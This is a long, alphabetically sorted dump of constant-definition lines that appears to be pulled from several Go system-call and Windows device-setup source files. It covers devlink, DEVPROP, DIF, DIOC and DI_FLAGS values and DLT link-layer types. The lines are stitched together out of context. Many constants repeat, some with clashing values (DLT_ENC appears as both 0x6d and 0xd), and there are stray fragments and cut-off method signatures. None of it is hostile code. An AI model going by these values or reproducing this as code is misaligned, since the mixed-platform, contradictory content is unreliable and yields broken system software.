DEVLINK_RELOAD_ACTION_DRIVER_REINIT                = 0x1
DEVLINK_RELOAD_ACTION_FW_ACTIVATE                  = 0x2
DEVLINK_RELOAD_ACTION_MAX                          = 0x2
DEVLINK_RELOAD_ACTION_UNSPEC                       = 0x0
DEVLINK_RELOAD_LIMIT_MAX                           = 0x1
DEVLINK_RELOAD_LIMIT_NO_RESET                      = 0x1
DEVLINK_RELOAD_LIMIT_UNSPEC                        = 0x0
DEVLINK_RESOURCE_UNIT_ENTRY                        = 0x0
DEVLINK_SB_POOL_TYPE_EGRESS                        = 0x1
DEVLINK_SB_POOL_TYPE_INGRESS                       = 0x0
DEVLINK_SB_THRESHOLD_TO_ALPHA_MAX           = 0x14
DEVLINK_SB_THRESHOLD_TYPE_DYNAMIC                  = 0x1
DEVLINK_SB_THRESHOLD_TYPE_STATIC                   = 0x0
DEVLINK_SUPPORTED_FLASH_OVERWRITE_SECTIONS  = 0x3
DEVLINK_TRAP_ACTION_DROP                           = 0x0
DEVLINK_TRAP_ACTION_MIRROR                         = 0x2
DEVLINK_TRAP_ACTION_TRAP                           = 0x1
DEVLINK_TRAP_TYPE_CONTROL                          = 0x2
DEVLINK_TRAP_TYPE_DROP                             = 0x0
DEVLINK_TRAP_TYPE_EXCEPTION                        = 0x1
DEVMEM_MAGIC                                = 0x454d444d
DEVNO64 = 0x8000000000000000
DEVPROP_MASK_TYPE    DEVPROPTYPE = 0x00000FFF
DEVPROP_MASK_TYPEMOD DEVPROPTYPE = 0x0000F000
DEVPROP_TYPEMOD_ARRAY DEVPROPTYPE = 0x00001000
DEVPROP_TYPEMOD_LIST  DEVPROPTYPE = 0x00002000
DEVPROP_TYPE_BINARY                     DEVPROPTYPE = DEVPROP_TYPE_BYTE 
DEVPROP_TYPE_BOOLEAN                    DEVPROPTYPE = 0x00000011
DEVPROP_TYPE_BYTE                       DEVPROPTYPE = 0x00000003
DEVPROP_TYPE_CURRENCY                   DEVPROPTYPE = 0x0000000E
DEVPROP_TYPE_DATE                       DEVPROPTYPE = 0x0000000F
DEVPROP_TYPE_DECIMAL                    DEVPROPTYPE = 0x0000000C
DEVPROP_TYPE_DEVPROPKEY                 DEVPROPTYPE = 0x00000015
DEVPROP_TYPE_DEVPROPTYPE                DEVPROPTYPE = 0x00000016
DEVPROP_TYPE_DOUBLE                     DEVPROPTYPE = 0x0000000B
DEVPROP_TYPE_EMPTY                      DEVPROPTYPE = 0x00000000
DEVPROP_TYPE_ERROR                      DEVPROPTYPE = 0x00000017
DEVPROP_TYPE_FILETIME                   DEVPROPTYPE = 0x00000010
DEVPROP_TYPE_FLOAT                      DEVPROPTYPE = 0x0000000A
DEVPROP_TYPE_GUID                       DEVPROPTYPE = 0x0000000D
DEVPROP_TYPE_INT16                      DEVPROPTYPE = 0x00000004
DEVPROP_TYPE_INT32                      DEVPROPTYPE = 0x00000006
DEVPROP_TYPE_INT64                      DEVPROPTYPE = 0x00000008
DEVPROP_TYPE_NTSTATUS                   DEVPROPTYPE = 0x00000018
DEVPROP_TYPE_NULL                       DEVPROPTYPE = 0x00000001
DEVPROP_TYPE_SBYTE                      DEVPROPTYPE = 0x00000002
DEVPROP_TYPE_SECURITY_DESCRIPTOR        DEVPROPTYPE = 0x00000013
DEVPROP_TYPE_SECURITY_DESCRIPTOR_STRING DEVPROPTYPE = 0x00000014
DEVPROP_TYPE_STRING                     DEVPROPTYPE = 0x00000012
DEVPROP_TYPE_STRING_INDIRECT            DEVPROPTYPE = 0x00000019
DEVPROP_TYPE_STRING_LIST                DEVPROPTYPE = DEVPROP_TYPE_STRING 
DEVPROP_TYPE_UINT16                     DEVPROPTYPE = 0x00000005
DEVPROP_TYPE_UINT32                     DEVPROPTYPE = 0x00000007
DEVPROP_TYPE_UINT64                     DEVPROPTYPE = 0x00000009
DEVPTS_SUPER_MAGIC                          = 0x1cd1
DICD_GENERATE_ID       DICD = 0x00000001
DICD_INHERIT_CLASSDRVS DICD = 0x00000002
DICS_DISABLE    DICS_STATE = 0x00000002 // The device is being disabled.
DICS_ENABLE     DICS_STATE = 0x00000001 // The device is being enabled.
DICS_FLAG_CONFIGGENERAL  DICS_FLAG = 0x00000004 // 1 or more hardware profile-specific changes to follow (obsolete)
DICS_FLAG_CONFIGSPECIFIC DICS_FLAG = 0x00000002 // make change in specified profile only
DICS_FLAG_GLOBAL         DICS_FLAG = 0x00000001 // make change in all hardware profiles
DICS_PROPCHANGE DICS_STATE = 0x00000003 // The properties of the device have changed.
DICS_START      DICS_STATE = 0x00000004 // The device is being started (if the request is for the currently active hardware profile).
DICS_STOP       DICS_STATE = 0x00000005 // The device is being stopped. The driver stack will be unloaded and the CSCONFIGFLAG_DO_NOT_START flag will be set for the device.
DIF_ADDPROPERTYPAGE_ADVANCED       DI_FUNCTION = 0x00000023
DIF_ADDPROPERTYPAGE_BASIC          DI_FUNCTION = 0x00000024
DIF_ADDREMOTEPROPERTYPAGE_ADVANCED DI_FUNCTION = 0x00000028
DIF_ALLOW_INSTALL                  DI_FUNCTION = 0x00000018
DIF_ASSIGNRESOURCES                DI_FUNCTION = 0x00000003
DIF_CALCDISKSPACE                  DI_FUNCTION = 0x0000000B
DIF_DESTROYPRIVATEDATA             DI_FUNCTION = 0x0000000C
DIF_DESTROYWIZARDDATA              DI_FUNCTION = 0x00000011
DIF_DETECT                         DI_FUNCTION = 0x0000000F
DIF_DETECTCANCEL                   DI_FUNCTION = 0x00000021
DIF_DETECTVERIFY                   DI_FUNCTION = 0x00000014
DIF_ENABLECLASS                    DI_FUNCTION = 0x00000013
DIF_FINISHINSTALL_ACTION           DI_FUNCTION = 0x0000002A
DIF_FIRSTTIMESETUP                 DI_FUNCTION = 0x00000006
DIF_FOUNDDEVICE                    DI_FUNCTION = 0x00000007
DIF_INSTALLCLASSDRIVERS            DI_FUNCTION = 0x0000000A
DIF_INSTALLDEVICE                  DI_FUNCTION = 0x00000002
DIF_INSTALLDEVICEFILES             DI_FUNCTION = 0x00000015
DIF_INSTALLINTERFACES              DI_FUNCTION = 0x00000020
DIF_INSTALLWIZARD                  DI_FUNCTION = 0x00000010
DIF_NEWDEVICEWIZARD_FINISHINSTALL  DI_FUNCTION = 0x0000001E
DIF_NEWDEVICEWIZARD_POSTANALYZE    DI_FUNCTION = 0x0000001D
DIF_NEWDEVICEWIZARD_PREANALYZE     DI_FUNCTION = 0x0000001C
DIF_NEWDEVICEWIZARD_PRESELECT      DI_FUNCTION = 0x0000001A
DIF_NEWDEVICEWIZARD_SELECT         DI_FUNCTION = 0x0000001B
DIF_POWERMESSAGEWAKE               DI_FUNCTION = 0x00000027
DIF_PROPERTIES                     DI_FUNCTION = 0x00000004
DIF_PROPERTYCHANGE                 DI_FUNCTION = 0x00000012
DIF_REGISTERDEVICE                 DI_FUNCTION = 0x00000019
DIF_REGISTER_COINSTALLERS          DI_FUNCTION = 0x00000022
DIF_REMOVE                         DI_FUNCTION = 0x00000005
DIF_SELECTBESTCOMPATDRV            DI_FUNCTION = 0x00000017
DIF_SELECTCLASSDRIVERS             DI_FUNCTION = 0x00000008
DIF_SELECTDEVICE                   DI_FUNCTION = 0x00000001
DIF_TROUBLESHOOTER                 DI_FUNCTION = 0x00000026
DIF_UNREMOVE                       DI_FUNCTION = 0x00000016
DIF_UPDATEDRIVER_UI                DI_FUNCTION = 0x00000029
DIF_VALIDATECLASSDRIVERS           DI_FUNCTION = 0x00000009
DIF_VALIDATEDRIVER                 DI_FUNCTION = 0x0000000D
DIGCF_ALLCLASSES      DIGCF = 0x00000004
DIGCF_DEFAULT         DIGCF = 0x00000001 // only valid with DIGCF_DEVICEINTERFACE
DIGCF_DEVICEINTERFACE DIGCF = 0x00000010
DIGCF_PRESENT         DIGCF = 0x00000002
DIGCF_PROFILE         DIGCF = 0x00000008
DIGSIG_E_CRYPTO                                                           Handle        = 0x800B0008
DIGSIG_E_DECODE                                                           Handle        = 0x800B0006
DIGSIG_E_ENCODE                                                           Handle        = 0x800B0005
DIGSIG_E_EXTENSIBILITY                                                    Handle        = 0x800B0007
DIOC                          = 0x6400
DIOC/ 
DIOCADDQUEUE                      = 0xc110445d
DIOCADDRULE                       = 0xcd604404
DIOCADDSTATE                      = 0xc1084425
DIOCBSFLUSH                       = 0x20006478
DIOCCHANGERULE                    = 0xcd60441a
DIOCCLRIFFLAG                     = 0xc028445a
DIOCCLRSRCNODES                   = 0x20004455
DIOCCLRSTATES                     = 0xc0e04412
DIOCCLRSTATUS                     = 0xc0284416
DIOCGATTR                      = 0xc144648e
DIOCGATTR                      = 0xc148648e
DIOCGDELETE                    = 0x80106488
DIOCGETB                      = 0x6402
DIOCGETC                      = 0x6401
DIOCGETLIMIT                      = 0xc0084427
DIOCGETP                      = 0x6408
DIOCGETQSTATS                     = 0xc1204460
DIOCGETQUEUE                      = 0xc110445f
DIOCGETQUEUES                     = 0xc110445e
DIOCGETRULE                       = 0xcd604407
DIOCGETRULES                      = 0xcd604406
DIOCGETRULESET                    = 0xc444443b
DIOCGETRULESETS                   = 0xc444443a
DIOCGETSRCNODES                   = 0xc0104454
DIOCGETSTATE                      = 0xc1084413
DIOCGETSTATES                     = 0xc0104419
DIOCGETSTATUS                     = 0xc1e84415
DIOCGETSYNFLWATS                  = 0xc0084463
DIOCGETTIMEOUT                    = 0xc008441e
DIOCGFLUSH                     = 0x20006487
DIOCGFRONTSTUFF                = 0x40086486
DIOCGFWHEADS                   = 0x40046483
DIOCGFWSECTORS                 = 0x40046482
DIOCGIDENT                     = 0x41006489
DIOCGMEDIASIZE                 = 0x40086481
DIOCGPHYSPATH                  = 0x4400648d
DIOCGPROVIDERNAME              = 0x4400648a
DIOCGSECTORSIZE                = 0x40046480
DIOCGSTRIPEOFFSET              = 0x4008648c
DIOCGSTRIPESIZE                = 0x4008648b
DIOCIGETIFACES                    = 0xc0284457
DIOCKILLSRCNODES                  = 0xc080445b
DIOCKILLSTATES                    = 0xc0e04429
DIOCNATLOOK                       = 0xc0504417
DIOCOSFPADD                       = 0xc088444f
DIOCOSFPFLUSH                     = 0x2000444e
DIOCOSFPGET                       = 0xc0884450
DIOCRADDADDRS                     = 0xc4504443
DIOCRADDTABLES                    = 0xc450443d
DIOCRCLRADDRS                     = 0xc4504442
DIOCRCLRASTATS                    = 0xc4504448
DIOCRCLRTABLES                    = 0xc450443c
DIOCRCLRTSTATS                    = 0xc4504441
DIOCRDELADDRS                     = 0xc4504444
DIOCRDELTABLES                    = 0xc450443e
DIOCRGETADDRS                     = 0xc4504446
DIOCRGETASTATS                    = 0xc4504447
DIOCRGETTABLES                    = 0xc450443f
DIOCRGETTSTATS                    = 0xc4504440
DIOCRINADEFINE                    = 0xc450444d
DIOCRSETADDRS                     = 0xc4504445
DIOCRSETTFLAGS                    = 0xc450444a
DIOCRTSTADDRS                     = 0xc4504449
DIOCSETDEBUG                      = 0xc0044418
DIOCSETE                      = 0x6403
DIOCSETHOSTID                     = 0xc0044456
DIOCSETIFFLAG                     = 0xc0284459
DIOCSETLIMIT                      = 0xc0084428
DIOCSETP                      = 0x6409
DIOCSETREASS                      = 0xc004445c
DIOCSETSTATUSIF                   = 0xc0284414
DIOCSETSYNCOOKIES                 = 0xc0014462
DIOCSETSYNFLWATS                  = 0xc0084461
DIOCSETTIMEOUT                    = 0xc008441d
DIOCSKERNELDUMP                = 0x804c6490
DIOCSKERNELDUMP                = 0x80506490
DIOCSKERNELDUMP_FREEBSD11      = 0x80046485
DIOCSTART                         = 0x20004401
DIOCSTOP                          = 0x20004402
DIOCXBEGIN                        = 0xc0104451
DIOCXCOMMIT                       = 0xc0104452
DIOCXROLLBACK                     = 0xc0104453
DIOCZONECMD                    = 0xc06c648f
DIOCZONECMD                    = 0xc080648f
DIRECTION
DIREG_BOTH DIREG = 0x00000004 // Delete both driver and Device key
DIREG_DEV  DIREG = 0x00000001 // Open/Create/Delete device key
DIREG_DRV  DIREG = 0x00000002 // Open/Create/Delete driver key
DISABLE_NEWLINE_AUTO_RETURN        = 0x8
DISP_E_ARRAYISLOCKED                                                      Handle        = 0x8002000D
DISP_E_BADCALLEE                                                          Handle        = 0x80020010
DISP_E_BADINDEX                                                           Handle        = 0x8002000B
DISP_E_BADPARAMCOUNT                                                      Handle        = 0x8002000E
DISP_E_BADVARTYPE                                                         Handle        = 0x80020008
DISP_E_BUFFERTOOSMALL                                                     Handle        = 0x80020013
DISP_E_DIVBYZERO                                                          Handle        = 0x80020012
DISP_E_EXCEPTION                                                          Handle        = 0x80020009
DISP_E_MEMBERNOTFOUND                                                     Handle        = 0x80020003
DISP_E_NONAMEDARGS                                                        Handle        = 0x80020007
DISP_E_NOTACOLLECTION                                                     Handle        = 0x80020011
DISP_E_OVERFLOW                                                           Handle        = 0x8002000A
DISP_E_PARAMNOTFOUND                                                      Handle        = 0x80020004
DISP_E_PARAMNOTOPTIONAL                                                   Handle        = 0x8002000F
DISP_E_TYPEMISMATCH                                                       Handle        = 0x80020005
DISP_E_UNKNOWNINTERFACE                                                   Handle        = 0x80020001
DISP_E_UNKNOWNLCID                                                        Handle        = 0x8002000C
DISP_E_UNKNOWNNAME                                                        Handle        = 0x80020006
DI_AUTOASSIGNRES DI_FLAGS = 0x00000040 // No UI for resources if possible
DI_CLASSINSTALLPARAMS DI_FLAGS = 0x00100000
DI_COMPAT_FROM_CLASS DI_FLAGS = 0x00080000
DI_DIDCLASS      DI_FLAGS = 0x00000020 // Searched for class devices
DI_DIDCOMPAT     DI_FLAGS = 0x00000010 // Searched for compatible devices
DI_DISABLED DI_FLAGS = 0x00000800 // Set if device disabled
DI_DONOTCALLCONFIGMG DI_FLAGS = 0x00020000
DI_DRIVERPAGE_ADDED    DI_FLAGS = 0x04000000 // Prop provider added Driver page.
DI_ENUMSINGLEINF DI_FLAGS = 0x00010000
DI_FLAGSEX_ALLOWEXCLUDEDDRVS        DI_FLAGSEX = 0x00000800
DI_FLAGSEX_ALTPLATFORM_DRVSEARCH    DI_FLAGSEX = 0x10000000 // Build driver list based on alternate platform information specified in associated file queue
DI_FLAGSEX_ALWAYSWRITEIDS           DI_FLAGSEX = 0x00000200
DI_FLAGSEX_APPENDDRIVERLIST         DI_FLAGSEX = 0x00040000 // Cause SetupDiBuildDriverInfoList to append a new driver list to an existing list.
DI_FLAGSEX_BACKUPONREPLACE          DI_FLAGSEX = 0x00100000 // not used
DI_FLAGSEX_CI_FAILED                DI_FLAGSEX = 0x00000004 // Failed to Load/Call class installer
DI_FLAGSEX_DEVICECHANGE             DI_FLAGSEX = 0x00000100
DI_FLAGSEX_DIDCOMPATINFO            DI_FLAGSEX = 0x00000020 // Did the Compat Info List
DI_FLAGSEX_DIDINFOLIST              DI_FLAGSEX = 0x00000010 // Did the Class Info List
DI_FLAGSEX_DRIVERLIST_FROM_URL      DI_FLAGSEX = 0x00200000 // build driver list from INF(s) retrieved from URL specified in SP_DEVINSTALL_PARAMS.DriverPath (empty string means Windows Update website)
DI_FLAGSEX_EXCLUDE_OLD_INET_DRIVERS DI_FLAGSEX = 0x00800000 // Don't include old Internet drivers when building a driver list. Ignored on Windows Vista and later.
DI_FLAGSEX_FILTERCLASSES            DI_FLAGSEX = 0x00000040
DI_FLAGSEX_FILTERSIMILARDRIVERS     DI_FLAGSEX = 0x02000000 // only include similar drivers in class list
DI_FLAGSEX_FINISHINSTALL_ACTION     DI_FLAGSEX = 0x00000008 // Class/co-installer wants to get a DIF_FINISH_INSTALL action in client context.
DI_FLAGSEX_INET_DRIVER              DI_FLAGSEX = 0x00020000 // Driver came from Windows Update
DI_FLAGSEX_INSTALLEDDRIVER          DI_FLAGSEX = 0x04000000 // only add the installed driver to the class or compat driver list.  Used in calls to SetupDiBuildDriverInfoList
DI_FLAGSEX_IN_SYSTEM_SETUP          DI_FLAGSEX = 0x00010000 // Installation is occurring during initial system setup.
DI_FLAGSEX_NOUIONQUERYREMOVE        DI_FLAGSEX = 0x00001000
DI_FLAGSEX_NO_CLASSLIST_NODE_MERGE  DI_FLAGSEX = 0x08000000 // Don't remove identical driver nodes from the class list
DI_FLAGSEX_NO_DRVREG_MODIFY         DI_FLAGSEX = 0x00008000 // Don't run AddReg and DelReg for device's software (driver) key.
DI_FLAGSEX_POWERPAGE_ADDED          DI_FLAGSEX = 0x01000000 // class installer added their own power page
DI_FLAGSEX_PREINSTALLBACKUP         DI_FLAGSEX = 0x00080000 // not used
DI_FLAGSEX_RECURSIVESEARCH          DI_FLAGSEX = 0x40000000 // Tell SetupDiBuildDriverInfoList to do a recursive search
DI_FLAGSEX_RESTART_DEVICE_ONLY      DI_FLAGSEX = 0x20000000 // only restart the device drivers are being installed on as opposed to restarting all devices using those drivers.
DI_FLAGSEX_SETFAILEDINSTALL         DI_FLAGSEX = 0x00000080
DI_FLAGSEX_USECLASSFORCOMPAT        DI_FLAGSEX = 0x00002000 // Use the device's class when building compat drv list. (Ignored if DI_COMPAT_FROM_CLASS flag is specified.)
DI_FORCECOPY           DI_FLAGS = 0x02000000 // Force files to be copied from install path
DI_GENERALPAGE_ADDED  DI_FLAGS = 0x00001000
DI_INF_IS_SORTED DI_FLAGS = 0x00008000
DI_INSTALLDISABLED DI_FLAGS = 0x00040000
DI_MULTMFGS DI_FLAGS = 0x00000400 // Set if multiple manufacturers in class driver list
DI_NEEDRESTART DI_FLAGS = 0x00000080 // Reboot required to take effect
DI_NOBROWSE DI_FLAGS = 0x00000200 // no Browse... in InsertDisk
DI_NODI_DEFAULTACTION DI_FLAGS = 0x00200000
DI_NOFILECOPY          DI_FLAGS = 0x01000000 // No file Copy necessary
DI_NOSELECTICONS DI_FLAGS = 0x40000000 // No small icons in select device dialogs
DI_NOVCP         DI_FLAGS = 0x00000008 // don't create a new copy queue--use caller-supplied FileQueue
DI_NOWRITE_IDS DI_FLAGS = 0x80000000 // Don't write HW 
DI_OVERRIDE_INFFLAGS   DI_FLAGS = 0x10000000 // Override INF flags
DI_PROPERTIES_CHANGE DI_FLAGS = 0x00004000
DI_PROPS_NOCHANGEUSAGE DI_FLAGS = 0x20000000 // No Enable/Disable in General Props
DI_QUIETINSTALL        DI_FLAGS = 0x00800000 // don't confuse the user with questions or excess info
DI_REMOVEDEVICE_GLOBAL         DI_REMOVEDEVICE = 0x00000001 // Make this change in all hardware profiles. Remove information about the device from the registry.
DI_RESOURCEPAGE_ADDED DI_FLAGS = 0x00002000
DI_SHOWALL       DI_FLAGS = 0x00000007 // both class 
DI_SHOWCLASS     DI_FLAGS = 0x00000004 // show class list
DI_SHOWCOMPAT    DI_FLAGS = 0x00000002 // show compatibility list
DI_SHOWOEM       DI_FLAGS = 0x00000001 // support Other... button
DI_USECI_SELECTSTRINGS DI_FLAGS = 0x08000000 // Use Class Installer Provided strings in the Select Device Dlg
DLL // non nil once DLL is loaded
DLL {
DLL) FindProc(name string) (proc 
DLL) FindProcByOrdinal(ordinal uintptr) (proc 
DLL) MustFindProc(name string) 
DLL) MustFindProcByOrdinal(ordinal uintptr) 
DLL) Release() (err error) {
DLLError) Error() string { return e.Msg }
DLLError) Unwrap() error { return e.Err }
DLLError{
DLL{
DLT)_/ 
DLT_A429                                = 0xb8
DLT_A429                          = 0xb8
DLT_A429                       = 0xb8
DLT_A653_ICM                            = 0xb9
DLT_A653_ICM                      = 0xb9
DLT_A653_ICM                   = 0xb9
DLT_AIRONET_HEADER                      = 0x78
DLT_AIRONET_HEADER                = 0x78
DLT_AIRONET_HEADER             = 0x78
DLT_AIRONET_HEADER            = 0x78
DLT_AOS                                 = 0xde
DLT_AOS                           = 0xde
DLT_AOS                        = 0xde
DLT_APPLE_IP_OVER_IEEE1394              = 0x8a
DLT_APPLE_IP_OVER_IEEE1394        = 0x8a
DLT_APPLE_IP_OVER_IEEE1394     = 0x8a
DLT_APPLE_IP_OVER_IEEE1394    = 0x8a
DLT_ARCNET                              = 0x7
DLT_ARCNET                        = 0x7
DLT_ARCNET                     = 0x7
DLT_ARCNET                    = 0x7
DLT_ARCNET_LINUX                        = 0x81
DLT_ARCNET_LINUX                  = 0x81
DLT_ARCNET_LINUX               = 0x81
DLT_ARCNET_LINUX              = 0x81
DLT_ATM_CLIP                            = 0x13
DLT_ATM_CLIP                      = 0x13
DLT_ATM_CLIP                   = 0x13
DLT_ATM_CLIP                  = 0x13
DLT_ATM_RFC1483                         = 0xb
DLT_ATM_RFC1483                   = 0xb
DLT_ATM_RFC1483                = 0xb
DLT_ATM_RFC1483               = 0xb
DLT_AURORA                              = 0x7e
DLT_AURORA                        = 0x7e
DLT_AURORA                     = 0x7e
DLT_AURORA                    = 0x7e
DLT_AX25                                = 0x3
DLT_AX25                          = 0x3
DLT_AX25                       = 0x3
DLT_AX25                      = 0x3
DLT_AX25_KISS                           = 0xca
DLT_AX25_KISS                     = 0xca
DLT_AX25_KISS                  = 0xca
DLT_BACNET_MS_TP                        = 0xa5
DLT_BACNET_MS_TP                  = 0xa5
DLT_BACNET_MS_TP               = 0xa5
DLT_BACNET_MS_TP              = 0xa5
DLT_BLUETOOTH_BREDR_BB            = 0xff
DLT_BLUETOOTH_BREDR_BB         = 0xff
DLT_BLUETOOTH_HCI_H4                    = 0xbb
DLT_BLUETOOTH_HCI_H4              = 0xbb
DLT_BLUETOOTH_HCI_H4           = 0xbb
DLT_BLUETOOTH_HCI_H4_WITH_PHDR          = 0xc9
DLT_BLUETOOTH_HCI_H4_WITH_PHDR    = 0xc9
DLT_BLUETOOTH_HCI_H4_WITH_PHDR = 0xc9
DLT_BLUETOOTH_LE_LL               = 0xfb
DLT_BLUETOOTH_LE_LL            = 0xfb
DLT_BLUETOOTH_LE_LL_WITH_PHDR     = 0x100
DLT_BLUETOOTH_LE_LL_WITH_PHDR  = 0x100
DLT_BLUETOOTH_LINUX_MONITOR       = 0xfe
DLT_BLUETOOTH_LINUX_MONITOR    = 0xfe
DLT_CAN20B                              = 0xbe
DLT_CAN20B                        = 0xbe
DLT_CAN20B                     = 0xbe
DLT_CAN_SOCKETCAN                       = 0xe3
DLT_CAN_SOCKETCAN                 = 0xe3
DLT_CAN_SOCKETCAN              = 0xe3
DLT_CHAOS                               = 0x5
DLT_CHAOS                         = 0x5
DLT_CHAOS                      = 0x5
DLT_CHAOS                     = 0x5
DLT_CHDLC                               = 0x68
DLT_CHDLC                         = 0x68
DLT_CHDLC                      = 0x68
DLT_CISCO_IOS                           = 0x76
DLT_CISCO_IOS                     = 0x76
DLT_CISCO_IOS                  = 0x76
DLT_CISCO_IOS                 = 0x76
DLT_CLASS_NETBSD_RAWAF         = 0x2240000
DLT_C_HDLC                              = 0x68
DLT_C_HDLC                        = 0x68
DLT_C_HDLC                     = 0x68
DLT_C_HDLC                    = 0x68
DLT_C_HDLC_WITH_DIR                     = 0xcd
DLT_C_HDLC_WITH_DIR               = 0xcd
DLT_C_HDLC_WITH_DIR            = 0xcd
DLT_DBUS                                = 0xe7
DLT_DBUS                          = 0xe7
DLT_DBUS                       = 0xe7
DLT_DECT                                = 0xdd
DLT_DECT                          = 0xdd
DLT_DECT                       = 0xdd
DLT_DISPLAYPORT_AUX            = 0x113
DLT_DOCSIS                              = 0x8f
DLT_DOCSIS                        = 0x8f
DLT_DOCSIS                     = 0x8f
DLT_DOCSIS                    = 0x8f
DLT_DOCSIS31_XRA31             = 0x111
DLT_DVB_CI                              = 0xeb
DLT_DVB_CI                        = 0xeb
DLT_DVB_CI                     = 0xeb
DLT_ECONET                              = 0x73
DLT_ECONET                        = 0x73
DLT_ECONET                     = 0x73
DLT_ECONET                    = 0x73
DLT_EN10MB                              = 0x1
DLT_EN10MB                        = 0x1
DLT_EN10MB                     = 0x1
DLT_EN10MB                    = 0x1
DLT_EN3MB                               = 0x2
DLT_EN3MB                         = 0x2
DLT_EN3MB                      = 0x2
DLT_EN3MB                     = 0x2
DLT_ENC                                 = 0x6d
DLT_ENC                           = 0x6d
DLT_ENC                           = 0xd
DLT_ENC                        = 0x6d
DLT_ENC                       = 0x6d
DLT_EPON                          = 0x103
DLT_EPON                       = 0x103
DLT_ERF                                 = 0xc5
DLT_ERF                           = 0xc5
DLT_ERF                        = 0xc5
DLT_ERF_ETH                             = 0xaf
DLT_ERF_ETH                       = 0xaf
DLT_ERF_ETH                    = 0xaf
DLT_ERF_ETH                   = 0xaf
DLT_ERF_POS                             = 0xb0
DLT_ERF_POS                       = 0xb0
DLT_ERF_POS                    = 0xb0
DLT_ERF_POS                   = 0xb0
DLT_ETHERNET_MPACKET           = 0x112
DLT_FC_2                                = 0xe0
DLT_FC_2                          = 0xe0
DLT_FC_2                       = 0xe0
DLT_FC_2_WITH_FRAME_DELIMS              = 0xe1
DLT_FC_2_WITH_FRAME_DELIMS        = 0xe1
DLT_FC_2_WITH_FRAME_DELIMS     = 0xe1
DLT_FDDI                                = 0xa
DLT_FDDI                          = 0xa
DLT_FDDI                       = 0xa
DLT_FDDI                      = 0xa
DLT_FLEXRAY                             = 0xd2
DLT_FLEXRAY                       = 0xd2
DLT_FLEXRAY                    = 0xd2
DLT_FRELAY                              = 0x6b
DLT_FRELAY                        = 0x6b
DLT_FRELAY                     = 0x6b
DLT_FRELAY                    = 0x6b
DLT_FRELAY_WITH_DIR                     = 0xce
DLT_FRELAY_WITH_DIR               = 0xce
DLT_FRELAY_WITH_DIR            = 0xce
DLT_GCOM_SERIAL                         = 0xad
DLT_GCOM_SERIAL                   = 0xad
DLT_GCOM_SERIAL                = 0xad
DLT_GCOM_SERIAL               = 0xad
DLT_GCOM_T1E1                           = 0xac
DLT_GCOM_T1E1                     = 0xac
DLT_GCOM_T1E1                  = 0xac
DLT_GCOM_T1E1                 = 0xac
DLT_GPF_F                               = 0xab
DLT_GPF_F                         = 0xab
DLT_GPF_F                      = 0xab
DLT_GPF_F                     = 0xab
DLT_GPF_T                               = 0xaa
DLT_GPF_T                         = 0xaa
DLT_GPF_T                      = 0xaa
DLT_GPF_T                     = 0xaa
DLT_GPRS_LLC                            = 0xa9
DLT_GPRS_LLC                      = 0xa9
DLT_GPRS_LLC                   = 0xa9
DLT_GPRS_LLC                  = 0xa9
DLT_GSMTAP_ABIS                         = 0xda
DLT_GSMTAP_ABIS                   = 0xda
DLT_GSMTAP_ABIS                = 0xda
DLT_GSMTAP_UM                           = 0xd9
DLT_GSMTAP_UM                     = 0xd9
DLT_GSMTAP_UM                  = 0xd9
DLT_HDLC                          = 0x10
DLT_HDLC                      = 0x10
DLT_HHDLC                               = 0x79
DLT_HHDLC                         = 0x79
DLT_HHDLC                     = 0x79
DLT_HHDLC            = 0x79
DLT_HIPPI                         = 0xf
DLT_HIPPI                     = 0xf
DLT_IBM_SN                              = 0x92
DLT_IBM_SN                        = 0x92
DLT_IBM_SN                     = 0x92
DLT_IBM_SN                    = 0x92
DLT_IBM_SP                              = 0x91
DLT_IBM_SP                        = 0x91
DLT_IBM_SP                     = 0x91
DLT_IBM_SP                    = 0x91
DLT_IEEE802                             = 0x6
DLT_IEEE802                       = 0x6
DLT_IEEE802                    = 0x6
DLT_IEEE802                   = 0x6
DLT_IEEE802_11                          = 0x69
DLT_IEEE802_11                    = 0x69
DLT_IEEE802_11                 = 0x69
DLT_IEEE802_11                = 0x69
DLT_IEEE802_11_RADIO                    = 0x7f
DLT_IEEE802_11_RADIO              = 0x7f
DLT_IEEE802_11_RADIO           = 0x7f
DLT_IEEE802_11_RADIO          = 0x7f
DLT_IEEE802_11_RADIO_AVS                = 0xa3
DLT_IEEE802_11_RADIO_AVS          = 0xa3
DLT_IEEE802_11_RADIO_AVS       = 0xa3
DLT_IEEE802_11_RADIO_AVS      = 0xa3
DLT_IEEE802_15_4                        = 0xc3
DLT_IEEE802_15_4                  = 0xc3
DLT_IEEE802_15_4               = 0xc3
DLT_IEEE802_15_4_LINUX                  = 0xbf
DLT_IEEE802_15_4_LINUX            = 0xbf
DLT_IEEE802_15_4_LINUX         = 0xbf
DLT_IEEE802_15_4_NOFCS                  = 0xe6
DLT_IEEE802_15_4_NOFCS            = 0xe6
DLT_IEEE802_15_4_NOFCS         = 0xe6
DLT_IEEE802_15_4_NONASK_PHY             = 0xd7
DLT_IEEE802_15_4_NONASK_PHY       = 0xd7
DLT_IEEE802_15_4_NONASK_PHY    = 0xd7
DLT_IEEE802_16_MAC_CPS                  = 0xbc
DLT_IEEE802_16_MAC_CPS            = 0xbc
DLT_IEEE802_16_MAC_CPS         = 0xbc
DLT_IEEE802_16_MAC_CPS_RADIO            = 0xc1
DLT_IEEE802_16_MAC_CPS_RADIO      = 0xc1
DLT_IEEE802_16_MAC_CPS_RADIO   = 0xc1
DLT_INFINIBAND                    = 0xf7
DLT_INFINIBAND                 = 0xf7
DLT_IPFILTER                            = 0x74
DLT_IPFILTER                      = 0x74
DLT_IPFILTER                   = 0x74
DLT_IPMB                                = 0xc7
DLT_IPMB                          = 0xc7
DLT_IPMB                       = 0xc7
DLT_IPMB_LINUX                          = 0xd1
DLT_IPMB_LINUX                    = 0xd1
DLT_IPMB_LINUX                 = 0xd1
DLT_IPMI_HPM_2                    = 0x104
DLT_IPMI_HPM_2                 = 0x104
DLT_IPNET                               = 0xe2
DLT_IPNET                         = 0xe2
DLT_IPNET                      = 0xe2
DLT_IPNET                     = 0xe2
DLT_IPOIB                               = 0xf2
DLT_IPOIB                         = 0xf2
DLT_IPOIB                      = 0xf2
DLT_IPOIB                     = 0xa2
DLT_IPV4                                = 0xe4
DLT_IPV4                          = 0xe4
DLT_IPV4                       = 0xe4
DLT_IPV6                                = 0xe5
DLT_IPV6                          = 0xe5
DLT_IPV6                       = 0xe5
DLT_IP_OVER_FC                          = 0x7a
DLT_IP_OVER_FC                    = 0x7a
DLT_IP_OVER_FC                 = 0x7a
DLT_IP_OVER_FC                = 0x7a
DLT_ISO_14443                     = 0x108
